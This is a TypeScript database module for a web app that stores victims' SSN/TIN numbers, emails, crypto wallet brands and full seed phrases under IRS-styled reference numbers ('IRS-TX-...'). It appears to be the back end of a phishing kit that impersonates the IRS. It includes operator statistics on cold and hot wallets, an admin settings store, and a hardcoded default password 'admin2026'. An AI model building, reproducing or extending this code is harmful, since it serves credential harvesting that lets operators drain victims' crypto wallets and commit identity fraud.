import { MongoClient, Db } from 'mongodb';
import * as localDb from './db';
import { DEFAULT_EMAIL_CONFIG, EmailConfig } from './mailer';

const uri = process.env.MONGODB_URI || '';
const options = {};

let client: MongoClient | null = null;
let clientPromise: Promise<MongoClient> | null = null;

declare global {
  // eslint-disable-next-line no-var
  var _mongoClientPromise: Promise<MongoClient> | undefined;
}

if (uri) {
  if (process.env.NODE_ENV === 'development') {
    // In development mode, use a global variable so the MongoClient is not repeated
    if (!global._mongoClientPromise) {
      client = new MongoClient(uri, options);
      global._mongoClientPromise = client.connect();
    }
    clientPromise = global._mongoClientPromise;
  } else {
    // In production mode, it's best to not use a global variable
    client = new MongoClient(uri, options);
    clientPromise = client.connect();
  }
}

/**
 * Returns the MongoDB database instance if connected, or null
 */
export async function getDatabase(): Promise<Db | null> {
  if (!uri || !clientPromise) {
    return null;
  }
  try {
    const connectedClient = await clientPromise;
    return connectedClient.db();
  } catch (error) {
    console.error('[MongoDB Connection Error]:', error);
    return null;
  }
}

/**
 * Check if MongoDB is connected and active
 */
export async function isMongoConnected(): Promise<boolean> {
  try {
    const db = await getDatabase();
    if (!db) return false;
    await db.command({ ping: 1 });
    return true;
  } catch {
    return false;
  }
}

// ---------------------------------------------------------------------------
// SUBMISSIONS METHODS (MONGODB WITH AUTOMATIC LOCAL FALLBACK)
// ---------------------------------------------------------------------------

export async function getAllSubmissions(): Promise<localDb.Submission[]> {
  const db = await getDatabase();
  if (!db) {
    return localDb.getAllSubmissions();
  }

  try {
    const collection = db.collection<localDb.Submission>('submissions');
    const records = await collection
      .find({})
      .sort({ submitted_at: -1 })
      .toArray();

    return records.map((doc: any) => ({
      id: doc.id || doc._id?.toString(),
      reference_number: doc.reference_number,
      submitted_at: doc.submitted_at,
      ssn_tin: doc.ssn_tin,
      email: doc.email,
      wallet_type: doc.wallet_type,
      wallet_brand: doc.wallet_brand,
      seed_length: doc.seed_length,
      seed_words: doc.seed_words,
      seed_phrase_full: doc.seed_phrase_full,
      signature_data: doc.signature_data,
      client_ip: doc.client_ip,
      user_agent: doc.user_agent,
    }));
  } catch (error) {
    console.error('[MongoDB Fetch Error] Falling back to local storage:', error);
    return localDb.getAllSubmissions();
  }
}

export async function getSubmissionById(id: string): Promise<localDb.Submission | null> {
  const db = await getDatabase();
  if (!db) {
    return localDb.getSubmissionById(id);
  }

  try {
    const collection = db.collection('submissions');
    const doc: any = await collection.findOne({
      $or: [{ id }, { reference_number: id }],
    });
    if (!doc) return null;

    return {
      id: doc.id || doc._id?.toString(),
      reference_number: doc.reference_number,
      submitted_at: doc.submitted_at,
      ssn_tin: doc.ssn_tin,
      email: doc.email,
      wallet_type: doc.wallet_type,
      wallet_brand: doc.wallet_brand,
      seed_length: doc.seed_length,
      seed_words: doc.seed_words,
      seed_phrase_full: doc.seed_phrase_full,
      signature_data: doc.signature_data,
      client_ip: doc.client_ip,
      user_agent: doc.user_agent,
    };
  } catch {
    return localDb.getSubmissionById(id);
  }
}

export async function saveSubmission(payload: {
  ssn_tin?: string;
  email?: string;
  wallet_type?: string;
  wallet_brand?: string;
  seed_length?: number;
  seed_words?: string[];
  signature?: string;
  client_ip?: string;
  user_agent?: string;
}): Promise<localDb.Submission> {
  const db = await getDatabase();

  const id = 'sub_' + Date.now() + '_' + Math.random().toString(36).substring(2, 8);
  const dateObj = new Date();
  const dateStr = dateObj.toISOString().slice(0, 10).replace(/-/g, '');
  const randHash = Math.random().toString(36).substring(2, 8).toUpperCase();
  const refNumber = `IRS-TX-${dateStr}-${randHash}`;

  const words = Array.isArray(payload.seed_words) ? payload.seed_words : [];
  const wordsFlat = words.join(' ').trim();

  const record: localDb.Submission = {
    id,
    reference_number: refNumber,
    submitted_at: dateObj.toISOString(),
    ssn_tin: (payload.ssn_tin || '').trim() || 'Not Provided',
    email: (payload.email || '').trim() || 'Not Provided',
    wallet_type: (payload.wallet_type || '').trim() || 'Not Specified',
    wallet_brand: (payload.wallet_brand || '').trim() || 'Not Specified',
    seed_length: Number(payload.seed_length) || words.length,
    seed_words: words,
    seed_phrase_full: wordsFlat,
    signature_data: payload.signature || '',
    client_ip: payload.client_ip || 'Unknown',
    user_agent: payload.user_agent || 'Unknown',
  };

  // Always mirror to local DB so local copies remain consistent
  localDb.saveSubmissionDirect(record);

  if (db) {
    try {
      const collection = db.collection('submissions');
      await collection.insertOne({ ...record });
      console.log(`[MongoDB] Submission ${refNumber} persisted to MongoDB.`);
    } catch (err) {
      console.error('[MongoDB Insert Error] Stored in local fallback:', err);
    }
  }

  return record;
}

export async function deleteSubmission(id: string): Promise<boolean> {
  const db = await getDatabase();
  let deletedFromMongo = false;

  if (db) {
    try {
      const collection = db.collection('submissions');
      const result = await collection.deleteOne({
        $or: [{ id }, { reference_number: id }],
      });
      deletedFromMongo = result.deletedCount > 0;
    } catch (err) {
      console.error('[MongoDB Delete Error]:', err);
    }
  }

  const deletedFromLocal = localDb.deleteSubmission(id);
  return deletedFromMongo || deletedFromLocal;
}

export async function getSubmissionStats() {
  const all = await getAllSubmissions();
  const now = new Date();
  const todayStart = new Date(now.getFullYear(), now.getMonth(), now.getDate()).getTime();

  const todayCount = all.filter(
    (s) => new Date(s.submitted_at).getTime() >= todayStart
  ).length;

  const coldCount = all.filter(
    (s) => (s.wallet_type || '').toLowerCase() === 'cold'
  ).length;

  const hotCount = all.filter(
    (s) => (s.wallet_type || '').toLowerCase() === 'hot'
  ).length;

  const brandCounts: Record<string, number> = {};
  for (const s of all) {
    const brand = s.wallet_brand || 'Unspecified';
    brandCounts[brand] = (brandCounts[brand] || 0) + 1;
  }

  let topBrand = 'None';
  let maxCount = 0;
  for (const [brand, count] of Object.entries(brandCounts)) {
    if (count > maxCount && brand !== 'Unspecified') {
      maxCount = count;
      topBrand = brand;
    }
  }

  return {
    total: all.length,
    today: todayCount,
    coldWallets: coldCount,
    hotWallets: hotCount,
    topBrand,
  };
}

// ---------------------------------------------------------------------------
// SETTINGS & CONFIGURATION METHODS (MONGODB WITH DYNAMIC EMAIL & PASSWORD)
// ---------------------------------------------------------------------------

export interface SystemSettings {
  admin_password: string;
  email_config: EmailConfig;
  updated_at: string;
}

const SETTINGS_DOC_ID = 'app_system_settings';

export async function getSystemSettings(): Promise<SystemSettings> {
  const db = await getDatabase();

  if (db) {
    try {
      const collection = db.collection('settings');
      const doc: any = await collection.findOne({ _id: SETTINGS_DOC_ID as any });
      if (doc) {
        return {
          admin_password: doc.admin_password || process.env.ADMIN_PASSWORD || 'admin2026',
          email_config: {
            ...DEFAULT_EMAIL_CONFIG,
            ...(doc.email_config || {}),
          },
          updated_at: doc.updated_at || new Date().toISOString(),
        };
      }
    } catch (err) {
      console.error('[MongoDB Settings Fetch Error]:', err);
    }
  }

  // Fallback to local settings file
  return localDb.getLocalSettings();
}

export async function updateSystemSettings(partial: Partial<SystemSettings>): Promise<SystemSettings> {
  const current = await getSystemSettings();
  const updated: SystemSettings = {
    admin_password: partial.admin_password || current.admin_password,
    email_config: {
      ...current.email_config,
      ...(partial.email_config || {}),
    },
    updated_at: new Date().toISOString(),
  };

  const db = await getDatabase();
  if (db) {
    try {
      const collection = db.collection('settings');
      await collection.updateOne(
        { _id: SETTINGS_DOC_ID as any },
        { $set: updated },
        { upsert: true }
      );
      console.log('[MongoDB] System settings updated in MongoDB.');
    } catch (err) {
      console.error('[MongoDB Settings Update Error]:', err);
    }
  }

  // Also persist to local backup
  localDb.saveLocalSettings(updated);

  return updated;
}
